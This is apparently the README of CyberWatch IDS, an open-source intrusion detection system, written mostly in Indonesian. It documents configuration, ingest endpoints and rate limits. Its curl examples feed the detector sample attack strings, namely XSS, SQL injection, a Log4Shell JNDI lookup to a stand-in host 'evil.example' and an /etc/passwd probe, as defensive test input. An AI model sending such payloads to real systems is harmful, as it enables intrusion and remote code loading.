# CyberWatch IDS

> Security Monitoring & Intrusion Detection System with CVE Database Reference

[![Build](https://github.com/heri99123/CyberwatchIDS/actions/workflows/build.yml/badge.svg)](https://github.com/heri99123/CyberwatchIDS/actions/workflows/build.yml)
[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL_3.0-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
[![Rust](https://img.shields.io/badge/Rust-1.85+-orange.svg)](https://www.rust-lang.org/)
[![Vue](https://img.shields.io/badge/Vue-3.0+-green.svg)](https://vuejs.org/)

## Tentang

CyberWatch IDS adalah sistem deteksi intrusi (IDS) berbasis web untuk monitoring keamanan jaringan organisasi. Dirancang sebagai SaaS multi-tenant dengan backend Rust untuk performa tinggi dan efisiensi memori.

## Tech Stack

| Layer | Technology |
|-------|-----------|
| **Frontend** | Vue 3 + Vite + TypeScript + Tailwind CSS + ECharts |
| **Backend** | Rust + Axum 0.7 + tokio + rusqlite (bundled) + r2d2 |
| **Auth** | jsonwebtoken + argon2 |
| **Database** | SQLite (rusqlite native binding) |
| **Deployment** | Docker multi-stage (rust:1.100.0-bookworm -> debian:bookworm-slim) |

## Fitur

- Real-time security event monitoring via WebSocket
- IDS pattern matching dengan regex (SQL injection, XSS, path traversal, dll)
- CVE database reference
- Multi-tenant dengan org_id data isolation
- JWT authentication + API keys
- IP reputation scoring
- Incident management workflow
- Attack simulator untuk testing
- Admin panel dengan audit logs
- **Rate limiting per IP** (tower-governor) untuk endpoint `/api/*` interaktif; endpoint ingest punya limiter terpisah yang lebih longgar
- **OWASP security headers** (CSP, X-Frame-Options, nosniff, Referrer-Policy, Permissions-Policy, HSTS opsional)
- **CORS restrictif** (same-origin by default) + **input validation** (validator)
- **Account lockout** progresif (5 percobaan gagal → kunci 15 menit, HTTP 429 + `Retry-After`) dengan audit log `login_failed` / `account_locked` / `login_blocked`
- **Email notifications** (lettre, async SMTP over rustls): welcome email saat registrasi + alert email untuk deteksi berseveritas tinggi, dengan opt-in per organisasi
- **Traffic ingest** (Task #29): `POST /api/ingest/webhook` (JSON single/batch) + `POST /api/ingest/syslog` (text/JSON) + listener UDP opsional; autentikasi API key `read-write`, hasilnya masuk dashboard, alert, dan email
- **27 built-in IDS rules** otomatis di-seed pada database baru (`INSERT OR IGNORE`, aman untuk upgrade)

## Konfigurasi Environment

Salin `backend/.env.example` ke `backend/.env`, lalu sesuaikan:

| Variable | Default | Keterangan |
|----------|---------|------------|
| `PORT` | `8421` | Port HTTP backend |
| `DATABASE_PATH` | `../data/cve-database.db` | Path SQLite |
| `JWT_SECRET` | *(dev default)* | **Wajib diganti di production** |
| `CORS_ALLOWED_ORIGINS` | *(kosong)* | Daftar origin dipisah koma. Kosong = same-origin only |
| `HSTS_ENABLED` | `false` | Aktifkan hanya di belakang TLS-terminating proxy |
| `RATE_LIMIT_PER_SECOND` | `2` | Interval replenish 1 token (detik) |
| `RATE_LIMIT_BURST` | `30` | Maksimum burst per IP |
| `RATE_LIMIT_TRUST_PROXY` | `false` | `true` hanya jika reverse proxy **menimpa** `X-Forwarded-For` |
| `LOGIN_MAX_FAILED_ATTEMPTS` | `5` | Jumlah percobaan login gagal sebelum akun dikunci (rentang 3–20) |
| `LOGIN_LOCKOUT_SECONDS` | `900` | Lama penguncian akun dalam detik (rentang 60–86400) |
| `SMTP_ENABLED` | `false` | Aktifkan email; tanpa ini semua pengiriman menjadi no-op |
| `SMTP_HOST` / `SMTP_PORT` | *(kosong)* / `587` | Host & port SMTP |
| `SMTP_TLS_MODE` | `starttls` | `starttls` (587), `implicit` (465), atau `none` (khusus dev lokal) |
| `SMTP_USERNAME` / `SMTP_PASSWORD` | *(kosong)* | Kredensial SMTP — jangan pernah di-commit |
| `SMTP_FROM` | `CyberWatch IDS <no-reply@localhost>` | Alamat pengirim |
| `ALERT_EMAIL_TO` | *(kosong)* | Penerima fallback bila tidak ada admin aktif |
| `ALERT_EMAIL_MIN_SEVERITY` | `CRITICAL` | Ambang severity: `CRITICAL`/`HIGH`/`MEDIUM`/`LOW` |
| `INGEST_RATE_PER_SECOND` / `INGEST_RATE_BURST` | `50` / `200` | Rate limit khusus endpoint ingest |
| `INGEST_MAX_BODY_BYTES` | `1048576` | Batas ukuran body ingest (1 MB) |
| `SYSLOG_UDP_PORT` | `0` | `0` = nonaktif; gunakan ≥1024 (mis. `5514`) untuk user non-root |
| `SYSLOG_UDP_API_KEY` | *(kosong)* | API key `read-write` yang menentukan org pemilik event UDP |

> **Email alert** hanya terkirim bila **dua** syarat terpenuhi: SMTP aktif di server **dan** toggle `emailAlerts` organisasi aktif (Admin → Organization). Penerima default adalah admin aktif organisasi. Semua pengiriman bersifat *fire-and-forget*, jadi kegagalan SMTP tidak pernah menggagalkan request.

> **Catatan keamanan:** `RATE_LIMIT_TRUST_PROXY=true` hanya aman bila ada reverse proxy tepercaya yang *mengganti* (bukan sekadar menambahkan) header `X-Forwarded-For` / `X-Real-IP`. Jika tidak, client bisa memalsukan IP untuk melewati rate limit.

## Integrasi Traffic Real (Task #29)

Endpoint ingest menerima traffic dari reverse proxy, WAF, atau log shipper, lalu menjalankannya melalui **regex IDS engine yang sama** dengan attack simulator. Event yang terdeteksi otomatis tersimpan, di-broadcast ke dashboard via WebSocket, memicu alert, dan (bila diaktifkan) mengirim email.

**Autentikasi:** header `X-API-Key: cw_...` dengan permission **Read & Write**, atau JWT `Authorization: Bearer ...` untuk pengujian dari dashboard. Buat key di Admin → API Keys; tersedia tombol *self-test* yang mengirim satu contoh serangan SQLi.

> ⚠️ API key lama yang dibuat sebelum migrasi `key_hash` **harus dirotasi**. Sebelumnya hanya `key_prefix` yang disimpan, sehingga key tersebut tidak pernah bisa diverifikasi.

### Webhook — HTTP request ternormalisasi

```bash
curl -X POST http://localhost:8421/api/ingest/webhook \
  -H "Content-Type: application/json" \
  -H "X-API-Key: cw_GANTI_DENGAN_KEY_ANDA" \
  -d '{"method":"GET","path":"/search?q=<script>alert(1)</script>","sourceIp":"203.0.113.42","destination":"app.example.com"}'
```

Field: `method`, `path`, `query`, `body`, `headers`, `sourceIp` (alias `clientIp`/`remote_addr`), `sourcePort`, `destination` (alias `host`), dan `raw` untuk request line mentah. Bila `sourceIp` kosong, sistem membaca `x-forwarded-for` / `x-real-ip` dari `headers`.

Tiga bentuk payload diterima: satu object, array object, atau `{"events":[...]}` (alias `records` / `logs` / `requests`).

```bash
# Batch
curl -X POST http://localhost:8421/api/ingest/webhook \
  -H "Content-Type: application/json" -H "X-API-Key: cw_..." \
  -d '{"events":[{"method":"GET","path":"/?id=1 UNION SELECT 1"},{"method":"POST","path":"/login","body":{"user":"admin OR 1=1"}}]}'
```

Respons: `{"accepted":1,"detections":1,"eventsCreated":1,"blocked":true,"truncated":false,"via":"api_key"}`.

### Syslog — HTTP

```bash
# Baris teks biasa (RFC3164/5424 tidak perlu di-parse ketat; seluruh baris discan rule IDS)
curl -X POST http://localhost:8421/api/ingest/syslog \
  -H "Content-Type: text/plain" -H "X-API-Key: cw_..." \
  --data-binary $'Nov 14 10:00:01 web1 sshd[123]: Failed password from 192.0.2.10\nNov 14 10:00:02 web1 app: ${jndi:ldap://evil.example/a}'

# Atau JSON
curl -X POST http://localhost:8421/api/ingest/syslog \
  -H "Content-Type: application/json" -H "X-API-Key: cw_..." \
  -d '{"lines":["Nov 14 10:00:01 web1 app: /etc/passwd access from 198.51.100.7"]}'
```

IP sumber diekstrak otomatis dari dalam baris (fallback ke IP peer pada mode UDP).

### Syslog — UDP (opsional)

Atur `SYSLOG_UDP_PORT=5514` dan `SYSLOG_UDP_API_KEY=<key read-write>` di `/etc/cyberwatch-ids.env`, lalu arahkan rsyslog:

```
# /etc/rsyslog.d/60-cyberwatch.conf
*.* @127.0.0.1:5514
```

Docker: `docker run -p 8421:8421 -p 5514:5514/udp ...`. Gunakan port ≥1024 karena service systemd berjalan sebagai user non-root. Listener UDP tidak punya auth per-request, sehingga **terikat ke satu organisasi** lewat `SYSLOG_UDP_API_KEY`; bila key tidak ditemukan/revoked atau bukan `read-write`, listener dinonaktifkan dan startup tetap sukses.

### Batas & keamanan

| Batas | Nilai |
|-------|-------|
| Record per webhook | 100 |
| Baris syslog per request | 200 |
| Deteksi diproses per request | 500 |
| Ukuran body | 1 MB (`INGEST_MAX_BODY_BYTES`) |
| Panjang field | 8.192 karakter (JSON dibatasi total 16.384 karakter) |

Semua input attacker-controlled di-*clamp* sebelum masuk regex engine (mencegah payload raksasa membebani CPU). Endpoint ingest punya rate limiter sendiri (`INGEST_RATE_PER_SECOND` / `INGEST_RATE_BURST`) sehingga log shipper tidak terkena limit 2 req/s API interaktif. Tetap letakkan endpoint ini di belakang reverse proxy / jaringan internal — jangan dibuka langsung ke internet tanpa TLS.

## Quick Start

### GitHub Codespaces (recommended, 120 jam/bulan gratis)

[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=heri99123/CyberwatchIDS)

### Local Development

```bash
# Frontend
npm install
npm run dev

# Backend (butuh Rust toolchain + gcc)
cd backend
cargo run --release
```

### Docker

```bash
docker build -t cyberwatch-ids .
docker run -p 8421:8421 cyberwatch-ids
```

## Architecture

```
CyberWatchIDS/
+-- src/                    # Vue 3 frontend
|   +-- views/              # Dashboard, Alerts, Events, CVE, Rules, Simulator
|   +-- api/                # TypeScript API client + WebSocket
|   +-- composables/        # Vue composables (useStore)
+-- backend/               # Rust backend
|   +-- src/
|   |   +-- main.rs         # Axum router, 37+ routes
|   |   +-- db.rs           # 12 tables, migrations, 27 seeded IDS rules, r2d2 pool
|   |   +-- auth.rs         # JWT, argon2, API key hashing
|   |   +-- security.rs     # OWASP headers, CORS policy, input validation
|   |   +-- mailer.rs       # Async SMTP email (welcome + alert), per-org opt-in
|   |   +-- event_pipeline.rs # Shared persistence + WS broadcast + alert email
|   |   +-- ids_engine.rs   # Regex IDS, event logging, IP reputation
|   |   +-- simulator.rs    # 30+ attack templates
|   |   +-- routes/         # auth, admin, ids, ingest, simulator, incidents, ws, health
|   +-- Cargo.toml
+-- Dockerfile              # Multi-stage build
+-- .github/workflows/      # CI/CD
+-- .devcontainer/          # GitHub Codespaces config
```

## License

Copyright (C) 2026 Heri Muhrial

This program is free software: you can redistribute it and/or modify it under the terms of the **GNU Affero General Public License v3.0** as published by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY. See the [LICENSE](LICENSE) file for details.

## Contributing

Lihat [CONTRIBUTING.md](CONTRIBUTING.md) untuk panduan berkontribusi.
